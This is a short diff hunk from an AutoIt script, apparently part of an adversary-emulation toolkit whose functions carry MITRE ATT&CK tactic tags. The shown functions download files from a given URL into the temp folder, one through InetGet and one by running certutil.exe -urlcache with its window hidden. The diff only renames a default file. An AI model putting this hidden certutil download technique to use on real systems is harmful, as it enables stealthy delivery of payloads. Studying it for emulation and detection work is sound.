@@ -263,7 +263,7 @@ Func HttpDownloadFile($sURL, $FileName = @TempDir & "\drop.tmp");DESCRIPTION:dow
    InetGet($sURL, $FileName, 1, 1)
 EndFunc
 
-Func CertUtilDownloader($url, $filePath = @TempDir & "\PSTools.zip") ;DESCRIPTION:use Cert Utility to download file;MITRE:LateralMovement,CommandAndControl
+Func CertUtilDownloader($url, $filePath = @TempDir & "\tools.ext") ;DESCRIPTION:use Cert Utility to download file;MITRE:LateralMovement,CommandAndControl
    If Not FileExists($filePath) Then
 	  RunWait("certutil.exe -urlcache -f " & $url & " " & $filePath,"" ,@SW_HIDE)
    EndIf
